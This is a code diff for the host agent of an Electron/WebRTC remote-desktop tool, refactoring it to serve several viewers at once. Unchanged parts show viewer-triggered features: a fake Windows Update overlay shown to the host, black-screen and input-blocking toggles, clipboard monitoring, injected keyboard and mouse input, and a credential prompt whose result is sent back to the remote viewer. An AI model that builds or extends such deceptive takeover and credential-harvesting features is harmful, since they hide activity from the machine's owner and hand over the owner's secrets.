@@ -25,8 +25,10 @@ const IS_ELECTRON = Boolean(window.electronAPI?.handleControl);
 // ---------------------------------------------------------------------------
 const agent = {
   ws:          null,
-  pc:          null,
-  dc:          null,
+  pc:          null,  // kept for backward compat (points to most recent peer)
+  dc:          null,  // kept for backward compat (points to most recent dc)
+  peers:       new Map(), // viewerIndex -> { pc, dc, dcKeepalive, disconnectTimeout, connectionState, connectedAt }
+  viewerCounter: 0,   // monotonically increasing viewer index
   stream:      null,
   blackStream: null,
   heartbeat:   null,
@@ -82,38 +84,17 @@ function shouldIgnoreDisconnect() {
 }
 
 function agentCleanupPeer() {
-  console.log('[host] 🧹 Cleaning up peer connection (state:', agent.connectionState, ')');
+  console.log('[host] 🧹 Cleaning up ALL peer connections');
 
-  // Clear keepalive interval
-  if (agent.dcKeepalive) {
-    clearInterval(agent.dcKeepalive);
-    agent.dcKeepalive = null;
+  // Clean up all viewer peers
+  for (const [idx, peer] of agent.peers.entries()) {
+    agentCleanupViewerPeer(idx);
   }
+  agent.peers.clear();
 
-  // Clear disconnect timeout
-  if (agent.disconnectTimeout) {
-    clearTimeout(agent.disconnectTimeout);
-    agent.disconnectTimeout = null;
-  }
-
-  if (agent.pc) {
-    agent.pc.onicecandidate = null;
-    agent.pc.oniceconnectionstatechange = null;
-    agent.pc.onconnectionstatechange = null;
-    agent.pc.ontrack = null;
-    agent.pc.close();
-    agent.pc = null;
-  }
-
-  if (agent.dc) {
-    agent.dc.onopen = null;
-    agent.dc.onclose = null;
-    agent.dc.onmessage = null;
-    agent.dc.onerror = null;
-    agent.dc.close();
-    agent.dc = null;
-  }
-
+  // Legacy compat
+  agent.pc = null;
+  agent.dc = null;
   agent.connecting = false;
   agent.connectionState = 'idle';
   agent.connectedAt = 0;
@@ -121,6 +102,43 @@ function agentCleanupPeer() {
   _setViewerConn(false);
   _setBlackScreen(false);
   _setBlockInput(false);
+}
+
+function agentCleanupViewerPeer(viewerIdx) {
+  const peer = agent.peers.get(viewerIdx);
+  if (!peer) return;
+
+  console.log(`[host] 🧹 Cleaning up peer for viewer #${viewerIdx}`);
+
+  if (peer.dcKeepalive) { clearInterval(peer.dcKeepalive); peer.dcKeepalive = null; }
+  if (peer.disconnectTimeout) { clearTimeout(peer.disconnectTimeout); peer.disconnectTimeout = null; }
+
+  if (peer.dc) {
+    peer.dc.onopen = null;
+    peer.dc.onclose = null;
+    peer.dc.onmessage = null;
+    peer.dc.onerror = null;
+    try { peer.dc.close(); } catch {}
+    peer.dc = null;
+  }
+
+  if (peer.pc) {
+    peer.pc.onicecandidate = null;
+    peer.pc.oniceconnectionstatechange = null;
+    peer.pc.onconnectionstatechange = null;
+    peer.pc.ontrack = null;
+    try { peer.pc.close(); } catch {}
+    peer.pc = null;
+  }
+
+  agent.peers.delete(viewerIdx);
+
+  // Update legacy compat refs if they pointed to this peer
+  if (agent.pc === peer.pc) { agent.pc = null; agent.dc = null; }
+
+  // Update UI — connected if any peer still active
+  const anyConnected = [...agent.peers.values()].some(p => p.connectionState === 'connected');
+  _setViewerConn(anyConnected);
 }
 
 // Apply Windows Update overlay: Shows fake Windows Update screen to HOST
@@ -150,13 +168,6 @@ function agentApplyBlackScreen(enabled) {
 
 async function agentCreateOffer() {
   console.log('[host] 📞 agentCreateOffer called');
-  console.log('[host] Current state:', {
-    connectionState: agent.connectionState,
-    connecting: agent.connecting,
-    streamReady: agent.streamReady,
-    hasPeer: !!agent.pc,
-    peerState: agent.pc?.connectionState,
-  });
 
   // Guard: stream must be ready
   if (!agent.streamReady || !agent.stream) {
@@ -171,170 +182,105 @@ async function agentCreateOffer() {
     return;
   }
 
-  // Guard: prevent duplicate simultaneous offers
-  if (agent.connecting) {
-    console.log('[host] ⏳ Already creating offer — skipping duplicate');
-    return;
-  }
+  // Assign a unique index to this viewer's peer connection
+  const viewerIdx = ++agent.viewerCounter;
+  console.log(`[host] 🆕 Creating peer connection for viewer #${viewerIdx} (total active: ${agent.peers.size + 1})`);
 
-  agent.connecting = true;
-  agent.connectionState = 'connecting';
-  agent.connectedAt = 0;
-
-  // Clean up any leftover peer
-  if (agent.pc) {
-    agent.pc.onicecandidate = null;
-    agent.pc.oniceconnectionstatechange = null;
-    agent.pc.onconnectionstatechange = null;
-    agent.pc.ontrack = null;
-    agent.pc.close();
-    agent.pc = null;
-  }
-  if (agent.dc) {
-    agent.dc.onopen = null;
-    agent.dc.onclose = null;
-    agent.dc.onmessage = null;
-    agent.dc.onerror = null;
-    agent.dc.close();
-    agent.dc = null;
-  }
+  // Per-viewer peer state
+  const peerState = {
+    pc: null,
+    dc: null,
+    dcKeepalive: null,
+    disconnectTimeout: null,
+    connectionState: 'connecting',
+    connectedAt: 0,
+  };
+  agent.peers.set(viewerIdx, peerState);
 
   // CREATE NEW PEER CONNECTION
-  console.log('[host] 🆕 Creating RTCPeerConnection with config:', RTC_CONFIG);
   const pc = new RTCPeerConnection(RTC_CONFIG);
+  peerState.pc = pc;
+
+  // Legacy compat — point agent.pc/dc to most recent peer
   agent.pc = pc;
 
   // ADD ALL TRACKS BEFORE CREATING OFFER
-  console.log('[host] 📎 Adding tracks to peer connection...');
   tracks.forEach(track => {
     pc.addTrack(track, agent.stream);
-    console.log(`[host] ✅ Track added: ${track.kind} (${track.id.slice(0,8)})`);
+    console.log(`[host] ✅ Track added to viewer #${viewerIdx}: ${track.kind}`);
   });
 
   // CREATE DATA CHANNEL (HOST SIDE ONLY)
   const dc = pc.createDataChannel('control', { ordered: true });
+  peerState.dc = dc;
   agent.dc = dc;
 
-  dc.onopen  = () => { 
-    console.log('[host] ✅ DataChannel OPEN');
-    // DO NOT change connectionState here - let peer connection state handle it
+  dc.onopen = () => {
+    console.log(`[host] ✅ DataChannel OPEN for viewer #${viewerIdx}`);
     _setViewerConn(true);
-    
-    // Start keepalive ping to prevent idle closure
-    if (agent.dcKeepalive) clearInterval(agent.dcKeepalive);
-    agent.dcKeepalive = setInterval(() => {
-      if (agent.dc?.readyState === 'open') {
-        try {
-          agent.dc.send(JSON.stringify({ type: 'ping' }));
-          console.log('[host] 📡 Keepalive ping sent');
-        } catch (err) {
-          console.warn('[host] ⚠️  Keepalive ping failed:', err.message);
-        }
+
+    // Start keepalive ping
+    peerState.dcKeepalive = setInterval(() => {
+      if (peerState.dc?.readyState === 'open') {
+        try { peerState.dc.send(JSON.stringify({ type: 'ping' })); } catch {}
       }
-    }, 5000); // Ping every 5 seconds
-    
-    // Start clipboard monitoring (Electron only)
-    if (IS_ELECTRON) {
-      startClipboardMonitoring();
-    }
+    }, 5000);
+
+    if (IS_ELECTRON) startClipboardMonitoring();
   };
-  
-  dc.onclose = () => { 
-    console.log('[host] ⚠️  DataChannel CLOSED (not treating as disconnect)');
-    // CRITICAL: DO NOT change connectionState or cleanup peer
-    // DataChannel can close while peer connection is still alive
-    // Only peer connection state should trigger cleanup
-    
-    // Clear keepalive
-    if (agent.dcKeepalive) {
-      clearInterval(agent.dcKeepalive);
-      agent.dcKeepalive = null;
-    }
-    
-    // Update UI but don't kill connection
-    _setViewerConn(false);
+
+  dc.onclose = () => {
+    console.log(`[host] ⚠️  DataChannel CLOSED for viewer #${viewerIdx}`);
+    if (peerState.dcKeepalive) { clearInterval(peerState.dcKeepalive); peerState.dcKeepalive = null; }
+    const anyConnected = [...agent.peers.values()].some(p => p.connectionState === 'connected');
+    _setViewerConn(anyConnected);
   };
 
   dc.onerror = (err) => {
-    // RTCError "User-Initiated Abort" = viewer closed the connection — not a real error
     const msg = err?.error?.message || '';
-    if (msg.includes('User-Initiated Abort') || msg.includes('Close called')) {
-      console.log('[host] ℹ️  DataChannel closed by viewer (normal disconnect)');
-    } else {
-      console.error('[host] ❌ DataChannel error:', err);
+    if (!msg.includes('User-Initiated Abort') && !msg.includes('Close called')) {
+      console.error(`[host] ❌ DataChannel error for viewer #${viewerIdx}:`, err);
     }
   };
 
   dc.onmessage = (e) => {
     try {
       const msg = JSON.parse(e.data);
-      
-      // Handle ping responses (ignore)
-      if (msg.type === 'ping' || msg.type === 'pong') {
-        return;
-      }
-      
-      console.log(`[host] 📨 DataChannel message: type=${msg.type}`);
+      if (msg.type === 'ping' || msg.type === 'pong') return;
 
-      // Handle clipboard sync from viewer
+      console.log(`[host] 📨 DC msg from viewer #${viewerIdx}: type=${msg.type}`);
+
+      // Clipboard sync
       if (msg.type === 'clipboard' && IS_ELECTRON) {
         if (msg.text && msg.text.length <= 1024 * 1024) {
           window.electronAPI.setClipboardText(msg.text).then(() => {
-            console.log(`[host] 📋 Clipboard updated from viewer (${msg.text.length} chars)`);
-            agent.lastClipboard = msg.text; // Update to prevent echo
-          }).catch(err => {
-            console.error('[host] ❌ Failed to write clipboard:', err);
-          });
-        } else if (msg.text && msg.text.length > 1024 * 1024) {
-          console.warn('[host] 📋 Clipboard content from viewer too large (>1MB) — ignoring');
+            agent.lastClipboard = msg.text;
+          }).catch(() => {});
         }
         return;
       }
 
-      // Forward to main process for OS-level execution (Electron only)
-      // Only forward input control events — not app-level messages
+      // Forward input events to OS
       const INPUT_TYPES = ['mouse_move', 'mouse_click', 'key_down', 'key_up', 'scroll', 'toggle', 'win_shortcut'];
       if (IS_ELECTRON && INPUT_TYPES.includes(msg.type)) {
         window.electronAPI.handleControl(msg);
       }
 
       if (msg.type === 'toggle') {
-        if (msg.action === 'black_screen') {
-          _setBlackScreen(msg.enabled);
-          agentApplyBlackScreen(msg.enabled);
-        }
-        if (msg.action === 'block_input') {
-          _setBlockInput(msg.enabled);
-          console.log(`[host] BLOCK_INPUT_${msg.enabled ? 'ENABLED' : 'DISABLED'}`);
-        }
+        if (msg.action === 'black_screen') { _setBlackScreen(msg.enabled); agentApplyBlackScreen(msg.enabled); }
+        if (msg.action === 'block_input') { _setBlockInput(msg.enabled); }
+      }
+      if (msg.type === 'set_quality' && msg.quality) agentSetQuality(msg.quality);
+      if (msg.type === 'set_audio_mode' && msg.mode) agentSetAudioMode(msg.mode);
+      if (msg.type === 'win_shortcut' && msg.keys && IS_ELECTRON) {
+        window.electronAPI.handleControl({ type: 'win_shortcut', keys: msg.keys });
       }
 
-      // Viewer requesting quality change
-      if (msg.type === 'set_quality' && msg.quality) {
-        console.log('[host] 🎚️  Viewer requested quality:', msg.quality);
-        agentSetQuality(msg.quality);
-      }
-
-      // Viewer requesting audio mode change
-      if (msg.type === 'set_audio_mode' && msg.mode) {
-        console.log('[host] 🎤 Viewer requested audio mode:', msg.mode);
-        agentSetAudioMode(msg.mode);
-      }
-
-      // Windows shortcut execution
-      if (msg.type === 'win_shortcut' && msg.keys) {
-        console.log('[host] ⊞ Windows shortcut:', msg.keys);
-        if (IS_ELECTRON) window.electronAPI.handleControl({ type: 'win_shortcut', keys: msg.keys });
-      }
-
-      // Viewer requesting credential prompt on host — v2
       if (msg.type === 'request_credentials') {
-        console.log('[host] 🔑 Viewer requested credential prompt');
         if (IS_ELECTRON && window.electronAPI) {
           window.electronAPI.requestCredentials().then(result => {
-            // Send result back to viewer via DataChannel
-            if (agent.dc?.readyState === 'open') {
-              agent.dc.send(JSON.stringify({
+            if (peerState.dc?.readyState === 'open') {
+              peerState.dc.send(JSON.stringify({
                 type: 'credential_result',
                 verified: result.verified,
                 credential: result.verified ? result.credential : null,
@@ -345,103 +291,78 @@ async function agentCreateOffer() {
         }
       }
     } catch (err) {
-      console.error('[host] ❌ Error parsing DataChannel message:', err);
+      console.error('[host] ❌ Error parsing DC message:', err);
     }
   };
 
   // ICE CANDIDATE HANDLER
   pc.onicecandidate = (e) => {
-    if (e.candidate) {
-      console.log('[host] 🧊 ICE candidate:', e.candidate.type, e.candidate.protocol);
-      if (agent.ws?.readyState === WebSocket.OPEN) {
-        agent.ws.send(JSON.stringify({ type: 'ice-candidate', candidate: e.candidate.toJSON() }));
-      }
-    } else {
-      console.log('[host] 🧊 ICE gathering complete');
+    if (e.candidate && agent.ws?.readyState === WebSocket.OPEN) {
+      agent.ws.send(JSON.stringify({ type: 'ice-candidate', candidate: e.candidate.toJSON() }));
     }
   };
 
-  // ICE CONNECTION STATE MONITORING
   pc.oniceconnectionstatechange = () => {
-    console.log('[host] 🧊 ICE CONNECTION STATE:', pc.iceConnectionState);
     if (pc.iceConnectionState === 'failed') {
-      console.error('[host] ❌ ICE connection failed');
-      agent.connecting = false;
-      agent.connectionState = 'disconnected';
-      console.log('[host] State changed: connecting → disconnected (ICE failed)');
-    } else if (pc.iceConnectionState === 'connected') {
-      console.log('[host] ✅ ICE connection established');
+      console.error(`[host] ❌ ICE failed for viewer #${viewerIdx}`);
+      agentCleanupViewerPeer(viewerIdx);
     }
   };
 
-  // PEER CONNECTION STATE MONITORING (SOURCE OF TRUTH)
+  // PEER CONNECTION STATE MONITORING
   pc.onconnectionstatechange = () => {
     const s = pc.connectionState;
-    console.log('[host] 🔌 PEER CONNECTION STATE:', s);
+    console.log(`[host] 🔌 Viewer #${viewerIdx} peer state: ${s}`);
 
     if (s === 'connected') {
-      agent.connecting = false;
+      peerState.connectionState = 'connected';
+      peerState.connectedAt = Date.now();
+      // Legacy compat
       agent.connectionState = 'connected';
-      agent.connectedAt = Date.now();
+      agent.connectedAt = peerState.connectedAt;
+      agent.connecting = false;
       _setViewerConn(true);
-      applyBitrateCap();
-      if (agent.disconnectTimeout) {
-        clearTimeout(agent.disconnectTimeout);
-        agent.disconnectTimeout = null;
-      }
+      applyBitrateCap(pc);
+      if (peerState.disconnectTimeout) { clearTimeout(peerState.disconnectTimeout); peerState.disconnectTimeout = null; }
     } else if (s === 'failed') {
-      agent.connecting = false;
-      agent.connectionState = 'idle';
-      agentCleanupPeer();
+      agentCleanupViewerPeer(viewerIdx);
     } else if (s === 'disconnected') {
-      // Reset connecting lock immediately so next viewer_connected isn't blocked
-      agent.connecting = false;
-      agent.connectionState = 'idle';
-      _setViewerConn(false);
-      // Give 2s for ICE to recover, then clean up
-      if (agent.disconnectTimeout) clearTimeout(agent.disconnectTimeout);
-      agent.disconnectTimeout = setTimeout(() => {
-        if (agent.pc && (agent.pc.connectionState === 'disconnected' || agent.pc.connectionState === 'failed')) {
-          agentCleanupPeer();
+      peerState.connectionState = 'disconnected';
+      if (peerState.disconnectTimeout) clearTimeout(peerState.disconnectTimeout);
+      peerState.disconnectTimeout = setTimeout(() => {
+        const p = agent.peers.get(viewerIdx);
+        if (p && (p.pc?.connectionState === 'disconnected' || p.pc?.connectionState === 'failed')) {
+          agentCleanupViewerPeer(viewerIdx);
         }
       }, 2000);
     } else if (s === 'closed') {
-      agent.connecting = false;
-      agent.connectionState = 'idle';
-      agent.connectedAt = 0;
+      peerState.connectionState = 'idle';
     }
   };
 
   // TRACK EVENT — receives viewer's mic in 2-way mode
   pc.ontrack = (event) => {
-    console.log('[host] 📥 Track received from viewer:', event.track.kind);
     if (event.track.kind === 'audio') {
-      // Play viewer's audio — always play incoming audio tracks
       const audio = new Audio();
       audio.srcObject = event.streams[0] || new MediaStream([event.track]);
       audio.autoplay = true;
       audio.play().catch(() => {});
-      console.log('[host] 🔊 Playing viewer audio');
+      console.log(`[host] 🔊 Playing viewer #${viewerIdx} audio`);
     }
   };
 
   // CREATE AND SEND OFFER
   try {
-    console.log('[host] 📝 Creating offer...');
     const offer = await pc.createOffer();
     await pc.setLocalDescription(offer);
-    
-    console.log('[host] ✅ Local description set, sending offer to viewer');
     agent.ws.send(JSON.stringify({
       type: 'offer',
       sdp: { type: pc.localDescription.type, sdp: pc.localDescription.sdp },
     }));
-    console.log('[host] 📤 Offer sent');
+    console.log(`[host] 📤 Offer sent for viewer #${viewerIdx}`);
   } catch (err) {
-    console.error('[host] ❌ Error creating/sending offer:', err);
-    agent.connecting = false;
-    agent.connectionState = 'idle';
-    agentCleanupPeer();
+    console.error(`[host] ❌ Error creating/sending offer for viewer #${viewerIdx}:`, err);
+    agentCleanupViewerPeer(viewerIdx);
   }
 }
 
@@ -670,25 +591,34 @@ async function agentStartMic() {
     agent.micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
     console.log('[host] 🎤 Microphone started');
 
-    if (agent.pc && agent.micStream) {
-      agent.micStream.getAudioTracks().forEach(track => {
-        agent.pc.addTrack(track, agent.micStream);
-        console.log('[host] ✅ Mic track added to peer');
-      });
-
-      // CRITICAL: Renegotiate so viewer receives the new audio track
-      try {
-        const offer = await agent.pc.createOffer();
-        await agent.pc.setLocalDescription(offer);
-        if (agent.ws?.readyState === WebSocket.OPEN) {
-          agent.ws.send(JSON.stringify({
-            type: 'offer',
-            sdp: { type: agent.pc.localDescription.type, sdp: agent.pc.localDescription.sdp },
-          }));
-          console.log('[host] 📤 Renegotiation offer sent (mic added)');
+    if (agent.peers.size > 0 && agent.micStream) {
+      const micTrack = agent.micStream.getAudioTracks()[0];
+      if (micTrack) {
+        for (const [idx, peer] of agent.peers.entries()) {
+          if (peer.pc) {
+            try {
+              peer.pc.addTransceiver(micTrack, { direction: 'sendonly', streams: [agent.micStream] });
+              console.log(`[host] ✅ Mic transceiver added to viewer #${idx}`);
+            } catch (err) {
+              console.warn(`[host] Could not add mic to viewer #${idx}:`, err.message);
+            }
+          }
         }
-      } catch (err) {
-        console.error('[host] ❌ Renegotiation failed:', err.message);
+
+        // CRITICAL: Renegotiate so viewer receives the new audio track
+        try {
+          const offer = await agent.pc.createOffer();
+          await agent.pc.setLocalDescription(offer);
+          if (agent.ws?.readyState === WebSocket.OPEN) {
+            agent.ws.send(JSON.stringify({
+              type: 'offer',
+              sdp: { type: agent.pc.localDescription.type, sdp: agent.pc.localDescription.sdp },
+            }));
+            console.log('[host] 📤 Renegotiation offer sent (mic added)');
+          }
+        } catch (err) {
+          console.error('[host] ❌ Renegotiation failed:', err.message);
+        }
       }
     }
   } catch (err) {
@@ -806,10 +736,11 @@ async function agentStartStream() {
 }
 
 // Apply bitrate cap to the active WebRTC sender
-async function applyBitrateCap() {
-  if (!agent.pc) return;
+async function applyBitrateCap(pc) {
+  const targetPc = pc || agent.pc;
+  if (!targetPc) return;
   const preset = QUALITY_PRESETS[agent.quality] || QUALITY_PRESETS.medium;
-  const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
+  const sender = targetPc.getSenders().find(s => s.track?.kind === 'video');
   if (!sender) return;
   try {
     const params = sender.getParameters();
@@ -822,7 +753,7 @@ async function applyBitrateCap() {
   }
 }
 
-// Change quality — restarts stream with new constraints and replaces WebRTC track
+// Change quality — restarts stream with new constraints and replaces WebRTC track on ALL peers
 async function agentSetQuality(q) {
   if (!QUALITY_PRESETS[q]) return;
   if (agent.quality === q) return;
@@ -837,15 +768,23 @@ async function agentSetQuality(q) {
   }
   await agentStartStream();
 
-  // Replace track on active peer connection
-  if (agent.pc && agent.stream) {
+  // Replace track on ALL active peer connections
+  if (agent.stream) {
     const newTrack = agent.stream.getVideoTracks()[0];
     if (newTrack) {
-      const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
-      if (sender) {
-        await sender.replaceTrack(newTrack);
-        await applyBitrateCap();
-        console.log('[host] ✅ Track replaced with quality:', q);
+      for (const [idx, peer] of agent.peers.entries()) {
+        if (peer.pc) {
+          const sender = peer.pc.getSenders().find(s => s.track?.kind === 'video');
+          if (sender) {
+            try {
+              await sender.replaceTrack(newTrack);
+              await applyBitrateCap(peer.pc);
+              console.log(`[host] ✅ Track replaced for viewer #${idx} with quality: ${q}`);
+            } catch (err) {
+              console.warn(`[host] Could not replace track for viewer #${idx}:`, err.message);
+            }
+          }
+        }
       }
     }
   }
